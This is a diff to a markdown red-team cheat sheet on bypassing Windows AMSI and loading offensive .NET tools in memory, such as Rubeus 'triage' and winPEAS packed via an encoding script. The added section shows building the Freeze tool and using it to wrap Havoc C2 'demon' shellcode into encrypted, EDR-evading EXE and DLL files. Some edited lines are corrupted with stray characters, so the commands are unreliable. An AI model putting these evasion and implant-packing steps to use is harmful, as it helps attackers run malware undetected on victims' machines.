@@ -75,10 +75,10 @@ $assem = [System.Reflection.Assembly]::Load($data);
 [Rubeus.Program]::MainString("triage");
 ```
 
-## Packing binary for powershell
+## Packing binary for powershellX
 
 ```powershell
-. .\EncodeAssembly.ps1
+. .\EncodeAssembly.ps1x1
 Invoke-EncodeAssembly -binaryPath .\winPEAS.exe -namespace winPEAS -capture $true
 ```
 
@@ -88,3 +88,19 @@ Invoke-EncodeAssembly -binaryPath .\winPEAS.exe -namespace winPEAS -capture $tru
 - https://amsi.fail/
 - https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
 - https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/
+
+
+## with Tools
+
+
+### Freeze
+
+
+```bash
+git clone https://github.com/Tylous/Freeze
+go build Freeze.go
+# Exe
+./Freeze -I demon.x64.bin -encrypt -O havoc_freeze.exe 
+# dll
+./Freeze -I demon.x64.bin -encrypt -export FunctionDLL -O name.dll
+```
